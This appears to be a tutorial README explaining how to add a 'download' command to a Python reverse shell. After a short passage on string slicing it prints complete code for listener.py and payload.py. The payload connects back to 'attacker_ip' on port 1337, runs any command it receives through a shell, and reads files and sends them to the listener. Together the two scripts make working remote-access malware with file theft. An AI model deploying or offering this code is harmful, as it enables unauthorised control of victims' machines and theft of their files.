<h2 align="center">Download Functionality</h2>
<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>

Pass download command with the name of file to download

command : `download message.txt`

If the command is starting from zero index

`cmd[0:`

Slice into two parts, first part starts with `D`  in `download`</br>
which will be at the zero index up to the exclusion position

`cmd[0:8] -> download`

You can start with initial index since the zero is optional

`cmd[:8] -> download`

The [8:9] index would be the whitespace inbetween the two slice</br>
Second part starts with [9] index till last index

`cmd[9:] -> message.txt`

- - - - - - - - - - - - - - - - - - - - - -
> [listener.py](listener.py)
```python
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()

def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    
    data = connection.recv(2048)
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data

while True:
	cmd = input("enter a command: ")
	
	if cmd == "quit":
		connection.send(b"quit")
		connection.close()
		break

	elif cmd[:2] == "cd":
		connection.send(bytes(cmd, "utf-8"))
		recv = recv_data()
		print(recv.decode("utf-8"))
		continue
	
	# If it's a download command
	elif cmd[:8] == "download":
		# Give download command to the Windows machine by send information
		connection.send(bytes(cmd, "utf-8"))
		# Get data in the listener and create file to store the data
		file_output = recv_data()
		# Open and save data in write binary mode, set name as write_data
		with open(f'{cmd[9:]}', 'wb') as write_data:
			# Use write function for the data information sent by client / windows machine
			write_data.write(file_output)
			write_data.close() # Close the file that have been written
		continue 
		
	connection.send(bytes(cmd, "utf-8"))
	
	output = recv_data()
	print(output.decode("utf-8"))

print("Server has stopped")
```
---
> [payload.py](payload.py)
```python
import socket
import subprocess

import os

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)
 
while True:
	cmd = payload.recv(2048)
	cmd = cmd.decode("utf-8")
	
	if cmd == "quit":
		payload.close()
		break
	
	elif cmd[:2] == "cd":
		try:
			os.chdir(cmd[3:])
		except FileNotFoundError:
			send_data(b"File not found")
		else:
			send_data(b"Changed directory")
		continue

	# Need to catch if the command is download
	elif cmd[:8] == "download": # Command sent to the client / windows machine
		# Get the file to download which is message.txt
		with open(f'{cmd[9:]}', 'rb') as data: # Open in read binary mode and set name as data
			data_read = data.read() # Read the data using function and store in a variable
			data.close() # Close after performing the operation
		# Send read data back to the server machine
		send_data(data_read)
		continue

	try:
		output = subprocess.check_output(cmd, shell = True)
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")
	else:
		send_data(output)

print("Disconnected") # display disconnection message
```

**Note** : The `message.txt` that was downloaded can be found in the same directory as the [listener.py](listener.py) is located.